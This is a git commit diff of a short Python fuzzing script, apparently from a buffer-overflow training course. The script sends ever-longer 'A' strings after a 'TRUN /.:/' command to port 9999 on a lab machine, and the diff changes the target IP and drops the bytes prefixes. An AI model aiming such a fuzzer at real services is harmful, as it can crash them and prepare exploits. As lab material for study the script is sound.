4d753e0aa2c0bec37d0083db55f2f2d735bf863a
AlphaBlue7 <62275748+AlphaBlue7@users.noreply.github.com>
2021-08-11 00:20:05 +0530

    Add files via upload

--- tcmfuzz.py
+++ tcmfuzz.py
@@ -2,18 +2,18 @@
 import sys, socket
 from time import sleep
      
-buffer = b"A" * 100
+buffer = "A" * 100
      
 while True:
      
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect(("192.168.1.6", 9999))
+        s.connect(("192.168.1.23", 9999))
      
-        s.send((b'TRUN /.:/' + buffer))
+        s.send(('TRUN /.:/' + buffer))
         s.close()
         sleep(1)
-        buffer = buffer + b"A"*100
+        buffer = buffer + "A"*100
      
     except:
      
